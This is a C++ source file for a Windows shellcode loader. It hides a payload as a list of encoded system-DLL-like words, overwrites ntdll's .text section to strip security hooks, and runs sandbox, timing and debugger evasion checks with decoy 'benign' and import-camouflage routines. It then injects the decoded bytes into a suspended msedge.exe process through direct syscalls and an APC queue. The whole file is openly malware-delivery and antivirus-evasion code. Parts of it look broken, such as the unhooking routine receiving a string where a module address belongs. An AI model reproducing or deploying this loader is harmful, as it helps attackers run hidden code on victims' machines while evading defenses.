#include <iostream>
#include <vector>
#include <string>
#include <chrono>
#include <thread>
#include <time.h>
#include <Windows.h>
#include <Psapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
// #include "include\HWSyscalls.h"
#include "include\syscalls.h"
#define NTDLL "NTDLL.DLL"

// typedef VOID(WINAPI *QueueUserAPC_t)(PAPCFUNC, HANDLE, ULONG_PTR);
//  typedef NTSTATUS(WINAPI* NtQueueApcThread_t)(HANDLE, PVOID, PVOID, PVOID, PVOID, ULONG);
//  typedef NTSTATUS(WINAPI* NtWriteProcessMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
// typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
//  typedef NTSTATUS(WINAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
//  typedef NTSTATUS(WINAPI* NtResumeThread_t)(HANDLE, PULONG);
//  typedef NTSTATUS(WINAPI* NtCreateProcess_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, BOOLEAN, HANDLE, HANDLE, HANDLE);

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

    PVOID pLocalNtdll = nullptr; // Define or replace with valid code to retrieve the local Ntdll base address

    // getting the dos header
    PIMAGE_DOS_HEADER pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
    if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // getting the nt headers
    PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
    if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PVOID pLocalNtdllTxt = NULL, pRemoteNtdllTxt = NULL; // local hooked text section base address and the unhooked text section base address
        SIZE_T		sNtdllTxtSize	= NULL; // the size of the text section


        // getting the text section
        PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
        
        for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {
            
            // the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
            if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {

                pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
    #ifdef MAP_NTDLL
                pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
    #endif 
    #ifdef READ_NTDLL
                pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);	
    #endif 
                sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
                break;
            }
        }


	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;
	

	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	
	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	
	return TRUE;
}


std::vector<std::string> encodedWords = {
    "xwreg",
    "C_20880",
    "trkwks",
    "xwreg",
    "winrshost",
    "fpb",
    "MFPlay",
    "xwreg",
    "dafBth",
    "Windows.Networking.HostName",
    "msvcp140_1d",
    "xwreg",
    "dafBth",
    "NfcRadioMedia",
    "WMNetMgr",
    "xwreg",
    "dafBth",
    "NfcRadioMedia",
    "iedkcs32",
    "xwreg",
    "dafBth",
    "appidtel",
    "xwreg",
    "dafBth",
    "appidtel",
    "xwreg",
    "dafBth",
    "NfcRadioMedia",
    "iedkcs32",
    "kanji_2",
    "spopk",
    "ProvPluginEng",
    "dafBth",
    "NfcRadioMedia",
    "netiohlp",
    "MTFAppServiceDS",
    "WerFault",
    "WMALFXGFXDSP",
    "xwreg",
    "C_20880",
    "defragproxy",
    "esentprf",
    "BioCredProv",
    "WorkFoldersGPExt",
    "trkwks",
    "wlanmsm",
    "xwreg",
    "WorkFoldersGPExt",
    "shfolder",
    "VPNv2CSP",
    "dafBth",
    "colbact",
    "AppContracts",
    "MTFAppServiceDS",
    "WerFault",
    "wiaaut",
    "rgb9rast",
    "C_20880",
    "WinSCard",
    "clfsw32",
    "dafBth",
    "FamilySafetyExt",
    "XblGameSaveExt",
    "rgb9rast",
    "WerFault",
    "wiaaut",
    "rgb9rast",
    "C_20880",
    "ulib",
    "clfsw32",
    "dafBth",
    "vm3ddevapi64-debug",
    "iedkcs32",
    "rgb9rast",
    "WerFault",
    "WMALFXGFXDSP",
    "rgb9rast",
    "C_20880",
    "DataUsageHandlers",
    "clfsw32",
    "dafBth",
    "cabview",
    "fveprompt",
    "rgb9rast",
    "WerFault",
    "SettingsHandlers_Troubleshoot",
    "fdeploy",
    "mbsmsapi",
    "NfcRadioMedia",
    "SettingsHandlers_Clipboard",
    "xwreg",
    "C_20880",
    "tsmf",
    "xwreg",
    "spopk",
    "RpcNs4",
    "IasMigPlugin",
    "xwreg",
    "dafBth",
    "cmintegrator",
    "fveprompt",
    "xwreg",
    "C_20880",
    "trkwks",
    "LanguageComponentsInstaller",
    "dafBth",
    "netiohlp",
    "eudcedit",
    "MTFAppServiceDS",
    "WerFault",
    "RDSAppXHelper",
    "xwreg",
    "spopk",
    "declaredconfiguration",
    "netcorehc",
    "GameBarPresenceWriter",
    "Utilman",
    "mlang",
    "xwreg",
    "trkwks",
    "tsmf",
    "fdeploy",
    "MSchedExe",
    "SettingsHandlers_Clipboard",
    "esentprf",
    "LanguageComponentsInstaller",
    "dafBth",
    "MDMAgent",
    "clfsw32",
    "LanguageComponentsInstaller",
    "dafBth",
    "MDMAgent",
    "appsruprov",
    "MTFAppServiceDS",
    "WerFault",
    "tsmf",
    "normaliz",
    "WMALFXGFXDSP",
    "xwreg",
    "C_20880",
    "defragproxy",
    "umrdp",
    "WorkFoldersGPExt",
    "KBDINGUJ",
    "xwreg",
    "SystemPropertiesDataExecutionPrevention",
    "Windows.UI.Xaml.Resources.rs5",
    "L2SecHC",
    "kd_0C_8086",
    "PerceptionSimulationManager",
    "ComputerToastIcon.contrast-white",
    "Windows.Media.BackgroundPlayback",
    "Windows.SharedPC.AccountManager",
    "CoreShell",
    "xwreg",
    "winrshost",
    "Windows.Devices.Enumeration",
    "xwreg",
    "WorkFoldersGPExt",
    "provisioningcsp",
    "VPNv2CSP",
    "winmmbase",
    "IasMigPlugin",
    "provisioningcsp",
    "WFDSConMgrSvc",
    "trkwks",
    "trkwks",
    "trkwks",
    "kanji_2",
    "spopk",
    "RASMM",
    "xwreg",
    "C_20880",
    "defragproxy",
    "xwreg",
    "winrshost",
    "dmusic",
    "winmmbase",
    "xwreg",
    "SystemPropertiesDataExecutionPrevention",
    "CoreShell",
    "wmerror",
    "SettingsHandlers_CapabilityAccess",
    "CoreShell",
    "sharemediacpl",
    "Windows.SharedPC.AccountManager",
    "Windows.Media.BackgroundPlayback",
    "Windows.SharedPC.AccountManager",
    "xwreg",
    "winrshost",
    "Windows.Devices.Enumeration",
    "winmmbase",
    "xwreg",
    "spopk",
    "dmusic",
    "xwreg",
    "trkwks",
    "wiaaut",
    "xwreg",
    "eudcedit",
    "mprapi",
    "iedkcs32",
    "LanguageComponentsInstaller",
    "trkwks",
    "declaredconfiguration"};

std::vector<std::string> wordList = {
    "LocationNotificationWindows",
    "WerFault",
    "wwancfg",
    "snmptrap",
    "MDMAgent",
    "mlang",
    "Spectrum",
    "KBDINGUJ",
    "VPNv2CSP",
    "AppVCatalog",
    "Windows.UI.Input.Inking.Analysis",
    "AppContracts",
    "cmintegrator",
    "fhuxcommon",
    "PimIndexMaintenanceClient",
    "Windows.UI.Xaml.Resources.rs5",
    "cscobj",
    "winbioext",
    "Family.Cache",
    "wpnprv",
    "colbact",
    "spbcd",
    "AcSpecfc",
    "ncuprov",
    "WMNetMgr",
    "AuditNativeSnapIn",
    "prauthproviders",
    "appidtel",
    "XblGameSaveExt",
    "imm32",
    "KBDTT102",
    "winsockhc",
    "iedkcs32",
    "containerdevicemanagement",
    "ScDeviceEnum",
    "RestartNowPower_80.contrast-white",
    "fveprompt",
    "umpnpmgr",
    "C_1251",
    "wlidsvc",
    "SimCfg",
    "C_20423",
    "fdBth",
    "sppwinob",
    "winnlsres",
    "DeviceEnroller",
    "elsTrans",
    "SSShim",
    "DxpTaskSync",
    "C_20880",
    "mbsmsapi",
    "KBDTAJIK",
    "forfiles",
    "cflapi",
    "cofire",
    "lpk",
    "AgentService",
    "msdelta",
    "whealogr",
    "IdCtrls",
    "netiohlp",
    "IPELoggingDictationHelper",
    "agentactivationruntime",
    "msvcp120_clr0400",
    "Windows.ApplicationModel.Store.TestingFramework",
    "LanguageComponentsInstaller",
    "pngfilt",
    "systemreset",
    "clfsw32",
    "rtmmvrortc",
    "uxlibres",
    "Windows.Devices.Custom",
    "xwreg",
    "kanji_2",
    "provdatastore",
    "ConsentExperienceCommon",
    "MTFAppServiceDS",
    "rgb9rast",
    "wiaacmgr",
    "msauserext",
    "winmmbase",
    "IasMigPlugin",
    "FamilySafetyExt",
    "normaliz",
    "KBDFR",
    "windowsperformancerecordercontrol",
    "normnfkc",
    "microsoft-windows-kernel-processor-power-events",
    "Windows.Networking.HostName",
    "SettingsHandlers_Clipboard",
    "vm3ddevapi64-debug",
    "NfcRadioMedia",
    "joy",
    "VpnSohDesktop",
    "pcwrun",
    "asferror",
    "msvcp140_1d",
    "wmidcom",
    "cabview",
    "NlsLexicons0009",
    "sspicli",
    "MFPlay",
    "esentprf",
    "wslapi",
    "AppVEntStreamingManager",
    "snmpapi",
    "iassvcs",
    "VMWSU",
    "iuilp",
    "libomp140.x86_64",
    "mfmpeg2srcsnk",
    "BthRadioMedia",
    "CloudRestoreLauncher",
    "sscore",
    "C_28596",
    "XpsToPclmConverter",
    "Utilman",
    "Windows.Management.SecureAssessment.CfgProvider",
    "FXSCOMPOSERES",
    "mswmdm",
    "scrobj",
    "dnsrslvr",
    "Hydrogen",
    "bcd",
    "srmscan",
    "sti_ci",
    "aspnet_counters",
    "eappcfgui",
    "umrdp",
    "BioCredProv",
    "appsruprov",
    "eudcedit",
    "vdsbas",
    "BdeHdCfg",
    "appvetwclientres",
    "Windows.Media.BackgroundPlayback",
    "wlanmsm",
    "spopk",
    "dmxmlhelputils",
    "dafBth",
    "timeout",
    "netplwiz",
    "themeservice",
    "NaturalLanguage6",
    "odbc32",
    "PerceptionSimulationManager",
    "prflbmsg",
    "SettingsHandlers_CapabilityAccess",
    "jscript9",
    "fhsvc",
    "kd_0C_8086",
    "clb",
    "advpack",
    "CloudExperienceHost",
    "Windows.SharedPC.AccountManager",
    "MP43DECD",
    "CoreShell",
    "main",
    "wmerror",
    "KBDRUM",
    "PickerHost",
    "SettingsHandlers_ContentDeliveryManager",
    "SvBannerBackground",
    "ortcengine",
    "twext",
    "CoreUIComponents",
    "GameBarPresenceWriter",
    "MicrosoftAccountTokenProvider",
    "L2SecHC",
    "iaspolcy",
    "pcacli",
    "mspatcha",
    "kdhvcom",
    "IcsEntitlementHost",
    "fclip",
    "profsvc",
    "WFDSConMgrSvc",
    "fsutil",
    "trie",
    "WsmAuto",
    "html",
    "KBDHE",
    "LegacySystemSettings",
    "CIRCoInst",
    "SystemPropertiesDataExecutionPrevention",
    "mfksproxy",
    "ComputerToastIcon.contrast-white",
    "SpaceAgent",
    "ActionCenter",
    "WinRTNetMUAHostServer",
    "httpprxp",
    "SetNetworkLocation",
    "tsmf",
    "WorkFoldersGPExt",
    "wiaaut",
    "WMALFXGFXDSP",
    "SettingsHandlers_Troubleshoot",
    "C_10006",
    "RASMM",
    "RDSAppXHelper",
    "lodctr",
    "defragproxy",
    "credui",
    "CloudDomainJoinAUG",
    "NgcIsoCtnr",
    "PlayToStatusProvider",
    "d3d10level9",
    "MbaeXmlParser",
    "Windows.Devices.Enumeration",
    "sharemediacpl",
    "WinSCard",
    "kbdgeooa",
    "qmgr",
    "KeyCredMgr",
    "declaredconfiguration",
    "termmgr",
    "ProvPluginEng",
    "rdvvmtransport",
    "mfc140ita",
    "ulib",
    "csplte",
    "GameSystemToastIcon",
    "GamePanel",
    "upnpcont",
    "iscsiwmi",
    "dmusic",
    "RpcNs4",
    "edpnotify",
    "DataUsageHandlers",
    "mfAACEnc",
    "MSchedExe",
    "fpb",
    "provisioningcsp",
    "shfolder",
    "NPSMDesktopProvider",
    "fdeploy",
    "mprapi",
    "reseteng",
    "socialapis",
    "C_10079",
    "apds",
    "dpx",
    "mimefilt",
    "netcorehc",
    "BdeUISrv",
    "mfc42",
    "FNTCACHE",
    "winrshost",
    "rwinsta",
    "shlwapi",
    "SensorsNativeApi.V2",
    "secur32",
    "systeminfo",
    "DMRServer",
    "SetNetworkLocationFlyout",
    "trkwks"};

std::vector<BYTE> Decode(const std::vector<std::string> &encodedWords)
{
    std::vector<BYTE> decodedShellcode;

    for (const auto &word : encodedWords)
    {
        auto it = std::find(wordList.begin(), wordList.end(), word);
        if (it != wordList.end())
        {
            decodedShellcode.push_back(static_cast<BYTE>(std::distance(wordList.begin(), it)));
        }
        else
        {
            throw std::runtime_error("Word '" + word + "' not found in word list.");
        }
    }

    return decodedShellcode;
}

void numaCheck()
{
    auto mem = VirtualAllocExNuma(GetCurrentProcess(), nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, 0);
    if (mem == nullptr)
    {
        exit(0);
    }
}

void debugCheck()
{
    if (IsDebuggerPresent())
    {
        exit(0);
    }
}

int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
           __TIME__[7] * 1 +
           __TIME__[6] * 10 +
           __TIME__[4] * 60 +
           __TIME__[3] * 600 +
           __TIME__[1] * 3600 +
           __TIME__[0] * 36000;
}

PVOID UpdatedHelper(PVOID *ppAddress) {

    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, 0x100);
    if (!pAddress)
        return NULL;
    
    srand((unsigned)time(NULL));
    *(int*)pAddress = rand() % 0xFF;
    
    *ppAddress = pAddress;
    return pAddress;
}

VOID ModifiedIatCamouflage() {

    PVOID   pAddress    = NULL;
    int*    A           = (int*)UpdatedHelper(&pAddress);
    unsigned __int64 i = 0; 
    
    if (*A > 400) {

        SendMessageA(NULL, 0, 0, 0);
        i = GetCurrentThreadId();
        SleepEx(0, FALSE);  
        OutputDebugStringA("Unreachable code");
        i = GetTickCount();
        i = CreateDirectoryA(NULL, NULL);
        i = DeleteFileA(NULL);
        i = SetEndOfFile(NULL);
    }

    HeapFree(GetProcessHeap(), 0, pAddress);
}

void sleepCheck()
{
    std::chrono::steady_clock::time_point startTime = std::chrono::steady_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
    std::chrono::steady_clock::time_point endTime = std::chrono::steady_clock::now();
    std::chrono::duration<double> elapsedTime = endTime - startTime;

    if (elapsedTime.count() < 1.5)
    {
        printf("Sleep duration is too short.\n");
        exit(0);
    }
}

DWORD WINAPI DisplayMessageBox(LPVOID lpParam)
{
    MessageBox(NULL, TEXT("This MessageBox will close automatically."), TEXT("UniqueAutoClosingMessageBoxTitle"), MB_OK);
    return 0;
}

void benign()
{
    DWORD threadId;
    HANDLE hThread = CreateThread(NULL, 0, DisplayMessageBox, NULL, 0, &threadId);
    if (hThread != NULL)
    {
        sleepCheck();

        Sleep(1000); // Adjust the time as necessary

        HWND hwndMsgBox = FindWindow(NULL, TEXT("UniqueAutoClosingMessageBoxTitle"));

        numaCheck();

        if (hwndMsgBox != NULL)
        {
            SendMessage(hwndMsgBox, WM_CLOSE, 0, 0);
        }

        WaitForSingleObject(hThread, INFINITE);

        CloseHandle(hThread);
    }

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    std::cout << "Screen Width: " << screenWidth << ", Screen Height: " << screenHeight << std::endl;

    // Get console window title
    wchar_t consoleTitle[1024];
    GetConsoleTitleW(consoleTitle, 1024);
    std::wcout << L"Console Window Title: " << consoleTitle << std::endl;

    // Get system directory
    wchar_t systemDirectory[MAX_PATH];
    GetSystemDirectoryW(systemDirectory, MAX_PATH);
    std::wcout << L"System Directory: " << systemDirectory << std::endl;

    // Get computer name
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerNameW(computerName, &size);
    std::wcout << L"Computer Name: " << computerName << std::endl;
}



void XORcrypt(char str2xor[], size_t len, char key) {
    int i;

    for (i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    //debugCheck();

    if (__argc != 1)
    {
        printf("This program does not accept any arguments.\n");
        return 0;
    }

    srand((unsigned)time(NULL));

    ReplaceNtdllTxtSection(NTDLL);

    int a = RandomCompileTimeSeed();


    benign();

    PVOID addressPointer = NULL;
    PVOID allocatedMemory = UpdatedHelper(&addressPointer);

    DWORD dwCreateSuspended = 0x00000004;
    DWORD memCommit = 0x00001000;
    DWORD pageExecuteReadWrite = 0x40;

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    CreateProcessA("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi);

    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;

    auto buf = Decode(encodedWords);

    LPVOID shellAddress = VirtualAllocEx(victimProcess, nullptr, buf.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    SIZE_T bytesWritten;

    NtWriteVirtualMemory(victimProcess, shellAddress, buf.data(), buf.size(), &bytesWritten);
    PKNORMAL_ROUTINE pfnAPC = reinterpret_cast<PKNORMAL_ROUTINE>(shellAddress);

    NtQueueApcThread(threadHandle, pfnAPC, nullptr, nullptr, nullptr);

    NtResumeThread(threadHandle, nullptr);

    CloseHandle(victimProcess);
    return 0;
}
